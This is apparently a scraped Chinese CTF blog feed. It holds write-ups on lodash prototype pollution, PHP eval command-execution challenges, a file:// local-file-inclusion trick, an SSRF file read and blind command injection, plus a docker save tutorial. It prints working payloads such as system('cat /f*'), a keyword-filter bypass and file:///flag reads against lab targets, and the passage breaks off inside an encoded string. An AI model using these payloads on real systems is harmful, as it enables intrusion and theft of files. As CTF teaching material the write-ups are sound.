function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">language</span>: data.<span class="property">language</span>, </span><br><span class="line">        <span class="attr">category</span>: data.<span class="property">category</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p><p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p><p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">Function</span>(<span class="params">importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source</span>)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="params">undefined, importsValues</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p><p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p><p><a href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p><p>可见，我们代码执行成功，返回了id命令的结果。</p><p>整个案例我觉得是一个非常经典的原型链污染漏洞教程，代码不多，逻辑不复杂，没有刻意创造漏洞，真正触发漏洞的代码在库中。</p><p>我一直觉得，出题不要刻意创造漏洞，而是找找你的知识点是否能在真实环境下找到应用。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker保存和打包镜像</title>
      <link href="/posts/5721bfe4.html"/>
      <url>/posts/5721bfe4.html</url>
      
        <content type="html"><![CDATA[<h2 id="docker保存和打包镜像"><a href="#docker保存和打包镜像" class="headerlink" title="docker保存和打包镜像"></a>docker保存和打包镜像</h2><p>作用：在现在容器镜像上保存镜像进行打包，在另一台服务上使用；或现有的容器安装了一些库，配置了开发环境，需要保存下载，下次加载后直接使用。</p><h4 id="1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）"><a href="#1-1-首先查看下现有容器镜像（目的是查询需要保存镜像的ID）" class="headerlink" title="1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）"></a>1.1 首先查看下现有容器镜像（目的是查询需要保存镜像的ID）</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure><h4 id="1-2-接下来用commit参数进行保存镜像（精简版）"><a href="#1-2-接下来用commit参数进行保存镜像（精简版）" class="headerlink" title="1.2 接下来用commit参数进行保存镜像（精简版）"></a>1.2 接下来用commit参数进行保存镜像（精简版）</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> commit  <span class="number">7</span>ca736d99653    yolov5:v6.<span class="number">2</span></span><br></pre></td></tr></table></figure><p>其中，7ca736d99653 是需要保存镜像的ID，刚才用docker ps -a 查询到的。</p><h2 id="打包tar"><a href="#打包tar" class="headerlink" title="打包tar"></a>打包tar</h2><p>使用save参数进行打包，格式如：docker save -o  tar文件名称     镜像REPOSITORY:TAG</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save -o yolov5-v6.2.tar yolov5:v6.2</span><br></pre></td></tr></table></figure><p>其中yolov5:v6.2 是需要保存镜像的REPOSITORY、和TAG；也是上面保存的镜像名称。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八届强网杯青少赛wp</title>
      <link href="/posts/2cd096fe.html"/>
      <url>/posts/2cd096fe.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="第八届强网杯青少赛wp"><a href="#第八届强网杯青少赛wp" class="headerlink" title="第八届强网杯青少赛wp"></a>第八届强网杯青少赛wp</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="签到漫画"><a href="#签到漫画" class="headerlink" title="签到漫画"></a>签到漫画</h4><blockquote><p>每个漫画的最后一张都是二维码的一部分，全部保存，然后拼在一起，扫描二维码出flag.。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155544679.png" alt="image-20241124155544679"></p><blockquote><p>flag{youthful_and_upward}</p></blockquote><h4 id="whitepic"><a href="#whitepic" class="headerlink" title="whitepic"></a>whitepic</h4><blockquote><p>考点：gif图像</p><p>下载文件，没有后缀名，能用010editor打开</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124155848111.png" alt="image-20241124155848111"></p><blockquote><p>根据文件头GIF89a，可以看出是个gif文件。直接使用gifsplitter分离帧数，在其中一帧找到flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160011013.png" alt="image-20241124160011013"></p><h4 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h4><blockquote><p>你懂的</p></blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="ezGetFlag"><a href="#ezGetFlag" class="headerlink" title="ezGetFlag"></a>ezGetFlag</h4><blockquote><p>考点：http请求方式</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160230507.png" alt=""></p><blockquote><p>点击10次会出现提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160307890.png" alt="image-20241124160307890"></p><blockquote><p>直接抓包，修改请求方式，把GET改成POST就行了。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160446998.png" alt="image-20241124160446998"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124160500182.png" alt="image-20241124160500182"></p><blockquote><p>flag{4efb5300-7885-40a9-bf2a-31bbd8ebef86}</p></blockquote><h4 id="ezFindShell"><a href="#ezFindShell" class="headerlink" title="ezFindShell"></a>ezFindShell</h4><blockquote><p>考点：代码审计</p></blockquote><p>这题是赛后复现，所以可能不全</p><p>首先拿到一堆php文件，用seay审计</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223303421.png" alt="image-20241130223303421"></p><p>非常相似，当时比赛没找到漏洞，现在复现，全局搜索一下post</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223557289.png" alt="image-20241130223557289"></p><p>发现可用漏洞</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130223624296.png" alt="image-20241130223624296"></p><p>array_filter() 函数用回调函数过滤数组中的元素。</p><p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p><p>将代码进行base64编码传上去应该就可利用该漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hubu新星杯实践能力赛模拟赛web-wp</title>
      <link href="/posts/98034dd5.html"/>
      <url>/posts/98034dd5.html</url>
      
        <content type="html"><![CDATA[<h4 id="ez-eval"><a href="#ez-eval" class="headerlink" title="ez_eval"></a>ez_eval</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hubu</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hubu&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hubu</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><p>先进行代码审计，GET传参hubu，并执行命令，没有任何绕过，放开手脚去做</p><p>payload:</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hubu=<span class="keyword">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);      #直接rce</span><br></pre></td></tr></table></figure><h4 id="rce-level1"><a href="#rce-level1" class="headerlink" title="rce_level1"></a>rce_level1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>代码审计，发现过滤了关键字flag,system,php。</p><p>使用拼接绕过构造payload:</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=(<span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>)(<span class="built_in">ls</span>);    <span class="comment">#发现目录下没有flag文件</span></span><br><span class="line">?c=(<span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>)(<span class="built_in">cat</span> /f*);   <span class="comment">#发现回显空白</span></span><br></pre></td></tr></table></figure><blockquote><p>不在文件夹里，那可能是在phpinfo里</p><p>payload：</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">c</span>=phpinfo();</span><br></pre></td></tr></table></figure><blockquote><p>没回显…根据代码的过滤可以知道，应该只过滤了三个关键字，可其实并不只过滤了这三个关键字。</p><p>经过测试，发现有隐藏过滤，比如关键字php，和一些字符如反斜杠\</p><p>最后的payload:</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>=(<span class="string">&#x27;ph&#x27;</span>.<span class="string">&#x27;pinfo&#x27;</span>)();</span><br></pre></td></tr></table></figure><blockquote><p>在页面中找到flag。</p></blockquote><h4 id="ez-LFI"><a href="#ez-LFI" class="headerlink" title="ez_LFI"></a>ez_LFI</h4><blockquote><p>考点：伪协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161059701.png" alt="image-20241124161059701"></p><blockquote><p>先随便传一个，/?url=111</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124161148073.png" alt="image-20241124161148073"></p><blockquote><p>代码审计，根据网上查询的parse_url()函数的资料显示：</p><p>解析 URL，返回其组成部分，如下：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname</span><br><span class="line">    [user] =&gt; username</span><br><span class="line">    [pass] =&gt; password</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; arg=value</span><br><span class="line">    [fragment] =&gt; anchor</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>所以必须在传入的url参数中让[host]是localhost。</p><p>然后再用file协议读取flag。</p><p>payload:</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/?url=file:/</span><span class="regexp">/localhost/</span>flag</span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{22290581-9558-4405-9c01-368dc660bf6a}</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="Cute-Rabbit"><a href="#Cute-Rabbit" class="headerlink" title="Cute Rabbit"></a>Cute Rabbit</h4><blockquote><p>考点：rabbit编码</p></blockquote><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VTJGc<span class="number">2</span>RHVmtYMS<span class="number">91</span>R<span class="symbol">nhkczF5</span>SU<span class="number">1</span>jdit<span class="number">1</span>K<span class="number">3</span><span class="meta">o0</span><span class="symbol">NzFCcDR2</span>aXcrVk<span class="symbol">NNaS9</span>TU<span class="number">1</span>QyZU<span class="number">5</span>EMFU<span class="attr">vSQo=</span></span><br></pre></td></tr></table></figure><blockquote><p>签到题，根据题目提示，是rabbit编码，密文末尾的=表示可能是base64，所以是</p><p>base64 -&gt; rabbit</p><p>HUBUCTF{S0_&lt;u73_R4b6it}</p></blockquote><h4 id="Docker-Forensic"><a href="#Docker-Forensic" class="headerlink" title="Docker Forensic"></a>Docker Forensic</h4><blockquote><p>考点：docker的使用</p><p>根据题目提示，先拉取镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull crpi-i24jskxbbxvfxlzp.cn-hangzhou.personal.cr.aliyuncs.com/st4rry/aliyun:ez_docker_forensic</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124162645328.png" alt="image-20241124162645328"></p><blockquote><p>将镜像压缩到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124164537663.png" alt="image-20241124164537663"></p><blockquote><p>将文件解压到一个目录下，然后切换到该目录。在该目录下有个sha256文件夹，把里面的文件解压</p><p>在tmp中找到password</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165519193.png" alt="image-20241124165519193"></p><blockquote><p>退级，在解压后的一个文件夹里找到flag.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124165719701.png" alt="image-20241124165719701"></p><blockquote><p>使用了加盐算法，密钥就是上面的password,进行解密</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171222266.png" alt="image-20241124171222266"></p><blockquote><p>HUBUCTF{1_L0v3_D0ck3r_F0r3ns1c_A}</p></blockquote><h4 id="SpeedMath"><a href="#SpeedMath" class="headerlink" title="SpeedMath"></a>SpeedMath</h4><blockquote><p>考点：nc连接，python脚本</p><p>先用nc连接</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241124171410644.png" alt="image-20241124171410644"></p><blockquote><p>发现会出现算数题目，但是给你输入的时间很短，所以几乎不可能手工做，直接问AI写脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_arithmetic_expression</span>(<span class="params">expression</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解析并计算算术表达式的结果。</span></span><br><span class="line"><span class="string">    这里假设表达式只包含整数和基本的加减乘除运算。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用eval计算表达式的结果，但注意eval的安全性问题</span></span><br><span class="line">        <span class="comment"># 在实际应用中，应该使用更安全的解析方法</span></span><br><span class="line">        result = <span class="built_in">eval</span>(expression)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error evaluating expression &#x27;<span class="subst">&#123;expression&#125;</span>&#x27;: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc_connection</span>(<span class="params">host, port</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用Netcat连接到服务器，并自动解答算术题。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 读取服务器发送的数据</span></span><br><span class="line">            data = s.recv(<span class="number">1024</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="comment"># 如果没有接收到数据，可能是连接已经关闭</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Received: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 使用正则表达式匹配算术题目</span></span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;Question \d+: (\d+) ([+\-*/]) (\d+) =&#x27;</span>, data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                num1 = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>))</span><br><span class="line">                operator = <span class="keyword">match</span>.group(<span class="number">2</span>)</span><br><span class="line">                num2 = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">3</span>))</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 构造算术表达式</span></span><br><span class="line">                expression = <span class="string">f&quot;<span class="subst">&#123;num1&#125;</span> <span class="subst">&#123;operator&#125;</span> <span class="subst">&#123;num2&#125;</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 计算正确答案</span></span><br><span class="line">                correct_answer = solve_arithmetic_expression(expression)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> correct_answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># 将答案发送回服务器（假设服务器期望的是整数答案）</span></span><br><span class="line">                    s.sendall(<span class="string">f&quot;<span class="subst">&#123;correct_answer&#125;</span>\n&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># 如果无法计算表达式，则退出循环</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Failed to solve expression.&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果不是算术题目，可能是其他信息或结束信息</span></span><br><span class="line">                <span class="comment"># 这里假设服务器在发送完所有题目后会发送一个非算术题目的消息</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Received non-arithmetic message, possibly final message.&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Final message: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">nc_connection(<span class="string">&#x27;challenge.hubuctf.cn&#x27;</span>, <span class="number">32478</span>)  <span class="comment"># 替换为你的服务器主机名和端口号</span></span><br></pre></td></tr></table></figure><blockquote><p>HUBUCTF{72e53365-bf9c-48db-8327-83b9c9269e7d}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华科第一届网络安全挑战赛wp</title>
      <link href="/posts/4971d2f4.html"/>
      <url>/posts/4971d2f4.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="华科第一届网络安全挑战赛wp"><a href="#华科第一届网络安全挑战赛wp" class="headerlink" title="华科第一届网络安全挑战赛wp"></a>华科第一届网络安全挑战赛wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="secure-shell"><a href="#secure-shell" class="headerlink" title="secure_shell"></a>secure_shell</h4><blockquote><p>考点：exec()无回显</p><p>对于这类题有个很简单的方法，直接将flag写进文件，然后路径读取就行</p><p>先测试一下能不能执行 cmd=1;sleep 4</p><p>发现反应了4秒，能执行</p><p>然后直接 cat /f* &gt; 1.txt</p><p>最后访问/1.txt路径就行</p></blockquote><h4 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h4><blockquote><p>考点：ssrf漏洞</p><p>打开有个提示 /get?site=</p><p>直接file读取flag</p><p>/get?site=file:///flag</p><p>碎碎念：以为很难。。。试了半天。。。。</p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="一闪一闪亮晶晶"><a href="#一闪一闪亮晶晶" class="headerlink" title="一闪一闪亮晶晶"></a>一闪一闪亮晶晶</h4><blockquote><p>考点：凯撒与base64结合，starry语言</p><p>根据提示，“凯撒大帝想学习一下Starry语言，你能帮帮他么吗”，一定跟凯撒密码和starry语言有关。</p><p>下载文件，是一串重复度非常高的字符串</p></blockquote><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBsJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzprJDthMjBhJDBhLzBhJDBhJDBhDjthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtLLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJBphLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphDjBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJD4hJDBhJDBhMjBsJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjphLzBhJDBhJDBvJBphJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhDjBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJBphJDBhJDtrJDBhMjBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhDjBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLhphJDBhJDBhLzphJDBhJDB